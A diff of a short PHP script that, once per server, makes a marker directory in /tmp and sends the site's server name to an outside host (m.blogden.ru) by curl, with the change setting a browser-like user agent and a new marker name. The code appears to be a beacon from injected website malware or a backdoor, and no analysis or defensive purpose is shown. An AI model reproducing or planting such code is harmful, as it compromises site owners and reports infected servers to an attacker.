@@ -1,14 +1,14 @@
 <?php
 $d=$_SERVER['SERVER_NAME'];
-if(filesize('/tmp/bvbaccrac'.$d)) { } else {
-	mkdir('/tmp/bvbaccrac'.$d);
+if(filesize('/tmp/bvbaccrac2'.$d)) { } else {
+	mkdir('/tmp/bvbaccrac2'.$d);
 	
 	
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
     CURLOPT_URL => 'https://m.blogden.ru/data/data.php?s='.$d.'',
-    CURLOPT_USERAGENT => ''
+    CURLOPT_USERAGENT => 'chrome'
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
